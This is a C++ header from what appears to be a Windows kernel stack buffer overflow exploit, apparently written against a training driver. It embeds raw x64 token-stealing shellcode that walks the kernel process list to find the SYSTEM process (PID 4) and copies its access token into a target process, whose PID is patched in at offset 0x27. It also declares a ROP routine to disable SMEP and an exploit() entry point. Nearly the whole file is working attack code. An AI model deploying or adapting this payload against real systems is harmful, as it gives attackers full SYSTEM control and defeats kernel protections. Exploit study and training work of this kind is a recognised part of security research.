#pragma once

#include "DefinesMacros.hpp"

namespace BufferOverflowStack
{

static constexpr size_t IN_BUFFER_SIZE = PAGE_SIZE;
static constexpr size_t KENREL_BUFFER_SIZE = 0x800;

static ByteVector SHELLCODE = { 0x65, 0x4C, 0x8B, 0x0C, 0x25, 0x88, 0x01, 0x00, 0x00, 0x4D, 0x8B, 0x89, 0x20, 0x02, 0x00, 0x00, 0x4C, 0x89, 0xC8, 0x48, 0x8B, 0x80, 0xD8, 0x01, 0x00, 0x00, 0x48, 0x2D, 0xD8, 0x01, 0x00, 0x00, 0x48, 0x81, 0xB8, 0xD0, 0x01, 0x00, 0x00, 0x34, 0x12, 0x00, 0x00, 0x75, 0xE6, 0x48, 0x89, 0xC1, 0x48, 0x81, 0xC1, 0x48, 0x02, 0x00, 0x00, 0x4C, 0x89, 0xC8, 0x48, 0x8B, 0x80, 0xD8, 0x01, 0x00, 0x00, 0x48, 0x2D, 0xD8, 0x01, 0x00, 0x00, 0x48, 0x83, 0xB8, 0xD0, 0x01, 0x00, 0x00, 0x04, 0x75, 0xE9, 0x48, 0x89, 0xC2, 0x48, 0x81, 0xC2, 0x48, 0x02, 0x00, 0x00, 0x48, 0x8B, 0x12, 0x48, 0x89, 0x11, 0xC3 }; // from shellcode.asm
static constexpr size_t PID_OFFSET = 0x27;

Address64 prepare_shellcode();

// Disable SMEP and jump to usermode shellcode
void prepare_rop(ByteVector& in_buffer, Address64 shellcode_address);

void exploit();

}